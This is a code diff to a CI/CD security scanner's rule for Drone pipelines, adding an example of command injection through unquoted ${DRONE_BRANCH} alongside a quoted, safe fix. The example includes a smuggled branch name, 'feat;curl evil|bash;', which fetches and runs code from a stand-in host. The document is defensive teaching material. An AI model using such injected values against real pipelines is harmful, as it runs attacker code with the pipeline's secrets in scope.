@@ -49,7 +49,7 @@ RULE = Rule(
         "command body. Quoted (``\"${DRONE_*}\"``) or "
         "single-quoted uses are safe in POSIX shell because "
         "the substitution runs after Drone's templating but "
-        "the shell still tokenises the expanded value as a "
+        "the shell still tokenizes the expanded value as a "
         "single argument. Same model as the Tekton TKN-003 / "
         "Argo ARGO-005 / Buildkite BK-003 rules in this catalog."
     ),
@@ -63,6 +63,39 @@ RULE = Rule(
         "unquoted use in (say) ``settings.message:`` doesn't "
         "fire here, those land under DR-004 / SBOM-style "
         "audits.",
+    ),
+    exploit_example=(
+        "# Vulnerable: a branch named ``feat;curl evil|bash;`` lands\n"
+        "# verbatim in the shell command via the\n"
+        "# ``${DRONE_BRANCH}`` template variable. The injected\n"
+        "# ``curl`` runs in the step's shell context with the\n"
+        "# step's full secret set in scope.\n"
+        "kind: pipeline\n"
+        "type: docker\n"
+        "name: build\n"
+        "steps:\n"
+        "  - name: build\n"
+        "    image: alpine@sha256:abc123...\n"
+        "    commands:\n"
+        "      - echo \"Building ${DRONE_BRANCH}\"\n"
+        "      - ./build.sh --branch ${DRONE_BRANCH}\n"
+        "\n"
+        "# Safe: assign the untrusted value to a local shell\n"
+        "# variable, quote on every use, and pass as an argument\n"
+        "# to a script you own. Drone's template substitution\n"
+        "# happens BEFORE the shell sees the command, so the\n"
+        "# defense has to be at the shell layer.\n"
+        "kind: pipeline\n"
+        "type: docker\n"
+        "name: build\n"
+        "steps:\n"
+        "  - name: build\n"
+        "    image: alpine@sha256:abc123...\n"
+        "    environment:\n"
+        "      BRANCH: ${DRONE_BRANCH}\n"
+        "    commands:\n"
+        "      - echo \"Building $BRANCH\"\n"
+        "      - ./build.sh --branch \"$BRANCH\""
     ),
 )
 
